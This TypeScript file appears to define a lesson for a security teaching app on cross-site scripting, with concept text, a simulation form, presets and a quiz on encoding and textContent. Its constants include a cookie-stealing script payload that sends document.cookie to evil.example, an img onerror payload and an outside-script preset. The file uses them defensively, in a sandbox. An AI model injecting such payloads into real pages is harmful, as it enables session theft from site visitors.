import { crossSiteScriptingCode, crossSiteScriptingSteps, DEFENSE_OPTIONS, WHERE_OPTIONS } from '../../security/scenarios/cross-site-scripting';
import type { LessonContent } from '../../types/lesson';
import type { PanelsView } from '../../types/visualization';

const [REFLECTED, STORED, DOM] = WHERE_OPTIONS;
const [OFF, ON, HTTP_ONLY] = DEFENSE_OPTIONS;
const STEAL = "<script>fetch('https://evil.example/c?' + document.cookie)</script>";
const IMAGE = '<img src=x onerror=alert(1)>';
const defaults = { where: REFLECTED!, input: STEAL, defense: OFF! };
// Only the page: the wire panel of a later step already shows what happened.
const pageSource = (crossSiteScriptingSteps(defaults).at(1)!.view as PanelsView).panels.find((panel) => panel.label === 'Page')!;

const content: LessonContent = {
  overview:
    'Cross-site scripting is injection into a web page. If a page repeats input as markup, that input becomes code running as the site itself, with the visitor\'s session. Here you type real payloads, a small tokenizer finds what a browser would run, and a small language runs it inside the simulation. Nothing you type runs in your real browser.',
  concept: [
    'A browser can\'t tell which parts of a page the site meant to write. If input lands in the page as a <script> tag, it runs with everything the page has: its cookies, its forms and its access to the site.',
    'There are three kinds. Reflected XSS repeats the address, so an attacker sends a link. Stored XSS saves the payload, so it reaches everyone who opens the page. DOM XSS happens only in the browser: the page\'s own script copies text into itself, and the text after a # never reaches the server.',
    'Encoding is the fix. It turns < into &lt;, so the browser draws the character rather than reading a tag. Encode when text is written into a page, not when it arrives, because only then do you know where it is going.',
    'innerHTML reads text as markup, and textContent does not. Browsers leave a <script> set through innerHTML inert, so attackers use a tag with a handler instead, such as an image with onerror.',
    'This lesson covers text between tags. A value inside an attribute, a URL, a style or a script needs its own rule, so HTML encoding alone is not enough there.',
    'HttpOnly keeps a cookie away from scripts, which is worth having. The script still runs, though, so it can act as the user on that page without ever reading the cookie. In production, use a template system that encodes by default, avoid raw HTML, sanitize any HTML you must accept with a library such as DOMPurify, and add a Content Security Policy as a second line.',
  ],
  howItWorks: [
    'Input reaches a page through the address, a saved row, or the page\'s own script.',
    'With no encoding, the browser reads it as markup.',
    'Any script in that markup runs in the site\'s origin.',
    'The script reads what it can and sends it out.',
    'With encoding, the same text is only characters on the screen.',
  ],
  visualization: {
    kind: 'form',
    fields: [
      { name: 'where', label: 'Where', type: 'choice', sample: defaults.where, options: WHERE_OPTIONS, help: 'How the input reaches the page.' },
      { name: 'input', label: 'Input', type: 'text', sample: defaults.input, help: '1 to 120 bytes. It only ever runs in the simulation, so try your own.' },
      { name: 'defense', label: 'Defense', type: 'choice', sample: defaults.defense, options: DEFENSE_OPTIONS, help: 'On is HTML encoding. HttpOnly only leaves encoding off and hides the cookie from scripts.' },
    ],
    presets: [
      { label: 'Reflected', values: defaults },
      { label: 'Stored', values: { ...defaults, where: STORED! } },
      { label: 'DOM with <script>', values: { ...defaults, where: DOM! } },
      { label: 'DOM with an image', values: { ...defaults, where: DOM!, input: IMAGE } },
      { label: 'Outside script', values: { ...defaults, input: '<script src=https://evil.example/x.js></script>' } },
      { label: 'HttpOnly', values: { ...defaults, defense: HTTP_ONLY! } },
      { label: 'Encoding on', values: { ...defaults, defense: ON! } },
    ],
    generate: crossSiteScriptingSteps,
    codeLabel: 'Pseudocode',
  },
  code: crossSiteScriptingCode,
  prosCons: {
    pros: ['Encoding on output removes the bug for HTML text', 'Modern templates do it by default', 'textContent is as easy to write as innerHTML'],
    cons: ['Each output context needs its own rule', 'One raw HTML call brings the bug back', 'Filters that hunt for <script> miss every other way in'],
    useWhen: ['Every time data reaches a page'],
    avoidWhen: ['Encoding only when input arrives', 'Writing user text with innerHTML'],
  },
  applications: [
    'Search pages that repeat the query',
    'Comments, reviews and profile names',
    'Pages that read the address and write it into themselves',
  ],
  commonMistakes: [
    'Blocking the word script and calling it done.',
    'Thinking HttpOnly stops XSS. It only protects the cookie.',
    'Assuming a server filter sees everything, when a fragment never reaches it.',
  ],
  quiz: [
    {
      id: 'q1',
      type: 'predict-next',
      prompt: 'This is the page the shop sent to alice, who is signed in. What does the browser do with it?',
      view: pageSource.view,
      options: ['Runs the script, which sends the cookie to evil.example', 'Shows the tag as text, because it came from a search', 'Refuses the page', 'Asks alice first, because the script is from another site'],
      answer: 0,
      explanation: 'The markup arrived in the page unencoded, so the browser treats it as the shop\'s own code.',
    },
    {
      id: 'q2',
      type: 'multiple-choice',
      prompt: 'Why does a stored payload reach more people than a reflected one?',
      options: ['It is saved, so it runs for everyone who opens the page', "It is encrypted, so filters can't read it", 'It runs on the server, so every visitor is affected', 'It needs no browser'],
      answer: 0,
      explanation: 'A reflected payload needs each victim to open a crafted link. A stored one waits in the page.',
    },
    {
      id: 'q3',
      type: 'code',
      prompt: 'Which line fixes this DOM XSS?',
      code: 'welcome.innerHTML = decodeURIComponent(location.hash.slice(1))',
      options: ['Use textContent in place of innerHTML', 'Remove decodeURIComponent', 'Set the cookie to HttpOnly', 'Add a server-side filter'],
      answer: 0,
      explanation: 'textContent never reads markup. A server filter can\'t help, because the fragment is never sent.',
    },
    {
      id: 'q4',
      type: 'multiple-choice',
      prompt: 'Why is <img src=x onerror=...> used against innerHTML when <script> is not?',
      options: ['A script set through innerHTML stays inert, and the image\'s error handler still fires', 'Images are always trusted, so browsers skip their checks', 'It avoids encoding, which only applies to script tags', 'It works only in old browsers'],
      answer: 0,
      explanation: 'The image fails to load, so its handler runs with no click.',
    },
  ],
  summary: [
    'XSS is input that becomes code on a page.',
    'Reflected, stored and DOM differ in how the input arrives.',
    'Encode on output, and use textContent.',
    'Each context needs its own encoding.',
    'HttpOnly protects a cookie, and the script still runs.',
  ],
};

export default content;
